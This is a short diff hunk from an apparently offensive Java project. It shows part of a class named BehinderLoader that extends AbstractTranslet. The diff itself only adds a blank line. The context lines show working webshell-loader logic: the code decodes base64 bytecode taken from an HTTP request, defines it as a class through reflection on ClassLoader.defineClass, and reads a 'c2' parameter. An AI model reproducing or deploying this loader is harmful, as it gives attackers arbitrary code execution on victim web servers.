@@ -82,6 +82,7 @@ public class BehinderLoader extends AbstractTranslet {
                                     byte[] var14 = (new BASE64Decoder()).decodeBuffer(var13);
                                     Method var15 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                                     var15.setAccessible(true);
+
                                     Class var16 = (Class)var15.invoke(BehinderLoader.class.getClassLoader(), var14, new Integer(0), new Integer(var14.length));
                                     String var17 = var10.getParameter("c2");
                                     byte[] var18 = (new BASE64Decoder()).decodeBuffer(var17);
